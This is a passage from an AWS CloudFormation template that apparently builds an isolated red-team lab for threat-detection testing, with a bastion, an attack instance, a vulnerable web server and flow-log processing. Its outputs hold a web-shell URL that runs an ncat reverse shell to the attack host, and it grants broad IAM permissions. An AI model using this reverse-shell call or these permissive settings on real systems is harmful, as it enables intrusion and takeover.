                "    var key = path + \"/\" + context.invokeid + \".gz\";\n",
                "\n",
                "    //console.log(JSON.stringify(event, null, 2));\n",
                "    // Serialize Operation\n",
                "    function iter(err) {\n",
                "        if (err) {\n",
                "            context.fail(err);\n",
                "            return;\n",
                "        }\n",
                "        record =  event.Records[i++];\n",
                "        if (!record) {\n",
                "            if (data.length === 0) {\n",
                "                context.succeed(\"No data to upload\");\n",
                "                return;\n",
                "            }\n",
                "            zlib.gzip(data.join(\"\\n\"),function ",
                "(err, result) {\n",
                "                if (err) return iter(err);\n",
                "                var params = {\n",
                "                    Bucket: bucket,\n",
                "                    Key: key,\n",
                "                    Body: result\n",
                "                };\n",
                "                s3.putObject(params, function(err, data) {\n",
                "                    if (err) return iter(err);\n",
                "                    console.log(\"Successfully uploaded ",
                "flowlog \" + bucket + \"/\" + key);\n",
                "                    context.succeed(\"Successfully processed ",
                "\" + event.Records.length + \" ",
                "record\");\n",
                "                    return;\n",
                "                });\n",
                "                return;\n",
                "            });\n",
                "            return;\n",
                "        }\n",
                "        var buffer = new ",
                "Buffer(record.kinesis.data, 'base64');\n",
                "        zlib.unzip(buffer, function(err, buffer) {\n",
                "            if (err) return iter(err);\n",
                "            var fl = JSON.parse(buffer.toString('ascii'));\n",
                "            data = data.concat(fl.logEvents.map(",
                "function(item) {\n",
                "                return item.message;\n",
                "            })).filter(function(item) {\n",
                "                return (item.indexOf('OK') == -1) ",
                "? false : true;\n",
                "            });\n",
                "            iter();\n",
                "        });\n",
                "    }\n",
                "    // Start iterator\n",
                "    iter();\n",
                "    return;\n",
                "};\n"
              ]
            ]
          }
        }
      }
    },
    "FlowLogsToCloudWatchIAMRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Statement": [
            {
              "Effect": "Allow",
              "Principal": {
                "Service": [
                  "vpc-flow-logs.amazonaws.com",
                  "cloudtrail.amazonaws.com"
                ]
              },
              "Action": "sts:AssumeRole"
            }
          ]
        },
        "Path": "/",
        "Policies": [
          {
            "PolicyName": "flowlogs",
            "PolicyDocument": {
              "Statement": [
                {
                  "Effect": "Allow",
                  "Action": [
                    "logs:CreateLogGroup",
                    "logs:CreateLogStream",
                    "logs:PutLogEvents",
                    "logs:DescribeLogGroups",
                    "logs:DescribeLogStreams"
                  ],
                  "Resource": "*"
                }
              ]
            }
          },
          {
            "PolicyName": "FullAccessCloudTrail",
            "PolicyDocument": {
              "Statement": [
              {
                "Effect": "Allow",
                "Action": [
                  "sns:AddPermission",
                  "sns:CreateTopic",
                  "sns:DeleteTopic",
                  "sns:ListTopics",
                  "sns:SetTopicAttributes",
                  "sns:GetTopicAttributes"
                ],
                "Resource": "*"
              },
              {
                "Effect": "Allow",
                "Action": [
                  "s3:CreateBucket",
                  "s3:DeleteBucket",
                  "s3:GetObject",
                  "s3:ListAllMyBuckets",
                  "s3:PutBucketPolicy",
                  "s3:GetBucketLocation",
                  "s3:GetBucketPolicy"
                ],
                "Resource": "*"
              },
              {
                "Effect": "Allow",
                "Action": "cloudtrail:*",
                "Resource": "*"
              },
              {
                "Effect": "Allow",
                "Action": [
                  "logs:CreateLogGroup"
                ],
                "Resource": "*"
              },
              {
                "Effect": "Allow",
                "Action": [
                  "iam:PassRole",
                  "iam:ListRoles",
                  "iam:GetRolePolicy",
                  "iam:GetUser"
                ],
                "Resource": "*"
              },
              {
                "Effect": "Allow",
                "Action": [
                  "kms:ListKeys",
                  "kms:ListAliases"
                ],
                "Resource": "*"
              }	
            ]
          }
          }
        ]
      }
    },
    "S3BucketPolicyCloudTrail": {
      "Type": "AWS::S3::BucketPolicy",
      "Properties": {
        "Bucket": {
          "Ref": "S3BucketCloudTrail"
        },
        "PolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Sid": "AWSCloudTrailAclCheck",
              "Effect": "Allow",
              "Principal": {
                "Service": "cloudtrail.amazonaws.com"
              },
              "Action": "s3:GetBucketAcl",
              "Resource": {
                  "Fn::GetAtt" : [
                    "S3BucketCloudTrail",
                    "Arn"
                    ]
              }
            },
            {
              "Sid": "AWSCloudTrailWrite",
              "Effect": "Allow",
              "Principal": {
                "Service": "cloudtrail.amazonaws.com"
              },
              "Action": "s3:PutObject",
              "Resource": {
                "Fn::Join": [
                  "",
                  [
                    "arn:aws:s3:::",
                    {
                      "Ref": "S3BucketCloudTrail"
                    },
                    "/AWSLogs/",
                    {
                      "Ref": "AWS::AccountId"
                    },
                    "/*"
                  ]
                ]
              },
              "Condition": {
                "StringEquals": {
                  "s3:x-amz-acl": "bucket-owner-full-control"
                }
              }
            }
          ]
        }
      }
    },
    "CloudWatchEventInvokeKinesisTargetRole": {
      "Type": "AWS::IAM::Role",
      "Properties": {
        "AssumeRolePolicyDocument": {
          "Version": "2012-10-17",
          "Statement": [
            {
              "Sid": "",
              "Effect": "Allow",
              "Principal": {
                "Service": "events.amazonaws.com"
              },
              "Action": "sts:AssumeRole"
            }
          ]
        }
      }
    }
  },
  "Outputs": {
    "BastionIp": {
      "Description": "Elastic IP for Bastion",
      "Value": {
        "Ref": "EIP"
      }
    },
    "RedTeamIp": {
      "Description": "Local IP for RedTeam Instance",
      "Value": {
        "Fn::GetAtt": [
          "RedTeam",
          "PrivateIp"
        ]
      }
    },
    "VulnWebServerIp": {
      "Description": "Local IP for VulnWebServer Instance",
      "Value": {
        "Fn::GetAtt": [
          "VulnWebServer",
          "PrivateIp"
        ]
      }
    },
    "WebShellURL": {
      "Description": "WebShell URL",
      "Value": {
        "Fn::Join": [
          "",
          [
            "http://",
            {
              "Fn::GetAtt": [
                "VulnWebServer",
                "PrivateIp"
              ]
            },
            "/index.php?cmd=ncat%20",
            {
              "Fn::GetAtt": [
                "RedTeam",
                "PrivateIp"
              ]
            },
            "%206666%20-e%20/bin/bash"
          ]
        ]
      }
    }
  },
  "Description": "This template creates the basic VPC infrastructure for an isolated testing environment. It will deploy a bastion host into the public subnet for a single Availability Zone so we have a protected point of entry. It will then create a linux instance with some red team scripts & tools that operate against common applications that are created in the same private subnet. **WARNING** This template creates Amazon EC2 instance and related resources. You will be billed for the AWS resources used if you create a stack from this template.",
  "Parameters": {
    "AvailabilityZones": {
      "Description": "Availability Zone to use for the subnets in the VPC. You can select many, but we just use 1 (the first).",
      "Type": "List<AWS::EC2::AvailabilityZone::Name>"
    },
    "KeyPairName": {
      "Description": "Public/private key pairs allow you to securely connect to your instance after it launches",
      "Type": "AWS::EC2::KeyPair::KeyName"
    },
    "ESDomainName": {
      "Description": "Elasticsearch Domain Name",
      "Type": "String",
      "Default": "guard-duty-findings"
    },
    "IndexName": {
      "Description": "Elasticsearch Index",
      "Type": "String",
      "Default": "gdt"
    },
    "PrivateSubnetCIDR": {
      "AllowedPattern": "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\\/(1[6-9]|2[0-8]))$",
      "ConstraintDescription": "CIDR block parameter must be in the form x.x.x.x/16-28",
      "Default": "172.16.0.16/28",
      "Description": "CIDR block for isolated private subnet.",
      "Type": "String"
    },
    "PublicSubnetCIDR": {
      "AllowedPattern": "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\\/(1[6-9]|2[0-8]))$",
      "ConstraintDescription": "CIDR block parameter must be in the form x.x.x.x/16-28",
      "Default": "172.16.0.0/28",
      "Description": "CIDR Block for the public DMZ subnet for secure administrative entry",
      "Type": "String"
    },
    "RemoteAccessCIDR": {
      "ConstraintDescription": "CIDR block parameter must be in the form x.x.x.x/x",
      "Default": "0.0.0.0/0",
      "Description": "CIDR from which access to bastion is to be permitted",
      "Type": "String"
    },
    "VPCCIDR": {
      "AllowedPattern": "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(\\/(1[6-9]|2[0-8]))$",
      "ConstraintDescription": "CIDR block parameter must be in the form x.x.x.x/16-28",
      "Default": "172.16.0.0/27",
      "Description": "CIDR Block for the VPC",
      "Type": "String"
    }
  },
  "Metadata": {
    "AWS::CloudFormation::Interface": {
      "ParameterGroups": [
        {
          "Label": {
            "default": "Network Configuration"
          },
          "Parameters": [
            "AvailabilityZones",
            "VPCCIDR",
            "PrivateSubnetCIDR",
            "PublicSubnetCIDR",
            "RemoteAccessCIDR"
          ]
        },
        {
          "Label": {
            "default": "Amazon EC2 Configuration"
          },
          "Parameters": [
            "KeyPairName"
          ]
        }
      ],
      "ParameterLabels": {
        "AvailabilityZones": {
          "default": "Availability Zones"
        },
        "KeyPairName": {
          "default": "Key Pair Name"
        },
        "PrivateSubnetCIDR": {
          "default": "Private Subnet CIDR"
        },
        "PublicSubnetCIDR": {
          "default": "Public Subnet CIDR"
        },
        "RemoteAccessCIDR": {
          "default": "Allowed Bastion External Access CIDR"
        },
        "VPCCIDR": {
          "default": "VPC CIDR"
        }
      }
    }
  },
  "Conditions": {
    "GovCloudCondition": {
      "Fn::Equals": [
        {
          "Ref": "AWS::Region"
        },
        "us-gov-west-1"
      ]
    },
    "NATInstanceCondition": {
      "Fn::Equals": [
        {
          "Ref": "AWS::Region"
        },
        "us-gov-west-1"
      ]
    },
    "NATGatewayCondition": {
      "Fn::Not": [
        {
          "Condition": "GovCloudCondition"
        }
      ]
    },
    "NVirginiaRegionCondition": {
      "Fn::Equals": [
        {
          "Ref": "AWS::Region"
        },
        "us-east-1"
      ]
    }
  },
  "Mappings": {
    "AWSAMIRegionMap": {
      "NATAMI": {
        "AWSNATHVM": "amzn-ami-vpc-nat-hvm-2017.03.0.20170401-x86_64-ebs"
      },
      "us-gov-west-1": {
        "AWSNATHVM": "ami-3f0a8f5e"
      },
      "AMI": {
        "AMZNLINUXHVM": "amzn-ami-hvm-2017.12.0.20171223-x86_64-gp2",
        "WS2012R2": "Windows_Server-2012-R2_RTM-English-64Bit-Base-2017.10.13"
      },
      "ap-northeast-1": {
        "AMZNLINUXHVM": "ami-c2680fa4",
        "WS2012R2": "ami-1a7ee47c"
      },
      "ap-northeast-2": {
        "AMZNLINUXHVM": "ami-3e04a450",
        "WS2012R2": "ami-0b4eee65"
      },
      "ap-south-1": {
        "AMZNLINUXHVM": "ami-3b2f7954",
        "WS2012R2": "ami-c488dfab"
      },
      "ap-southeast-1": {
        "AMZNLINUXHVM": "ami-4f89f533",
        "WS2012R2": "ami-c83944b4"
      },
      "ap-southeast-2": {
        "AMZNLINUXHVM": "ami-38708c5a",
        "WS2012R2": "ami-30a55952"
      },
      "ca-central-1": {
        "AMZNLINUXHVM": "ami-7549cc11",
        "WS2012R2": "ami-b9b431dd"
      },
      "eu-central-1": {
        "AMZNLINUXHVM": "ami-1b2bb774",
        "WS2012R2": "ami-3204995d"
      },
      "eu-west-1": {
        "AMZNLINUXHVM": "ami-db1688a2",
        "WS2012R2": "ami-cc821eb5"
      },
      "eu-west-2": {
        "AMZNLINUXHVM": "ami-6d263d09",
        "WS2012R2": "ami-9f677cfb"
      },
      "sa-east-1": {
        "AMZNLINUXHVM": "ami-f1337e9d",
        "WS2012R2": "ami-d6c785ba"
      },
      "us-east-1": {
        "AMZNLINUXHVM": "ami-428aa838",
        "WS2012R2": "ami-013e197b"
      },
      "us-east-2": {
        "AMZNLINUXHVM": "ami-710e2414",
        "WS2012R2": "ami-02446e67"
      },
      "us-west-1": {
        "AMZNLINUXHVM": "ami-4a787a2a",
        "WS2012R2": "ami-92fefdf2"
      },
      "us-west-2": {
        "AMZNLINUXHVM": "ami-7f43f307",
        "WS2012R2": "ami-afe051d7"
      }
    },
    "AMINameMap": {
      "Amazon-Linux-HVM": {
        "Code": "AMZNLINUXHVM"
      },
      "Windows-Server-2012": {
        "Code": "WS2012R2"
      }
    },
    "Defaults": {
      "LogGroup": {
        "RetentionInDays": 1
      },
      "Stream": {
        "ShardCount": 10
      },
      "EventSourceMapping": {
        "BatchSize": 10000
      }
    }
  }
}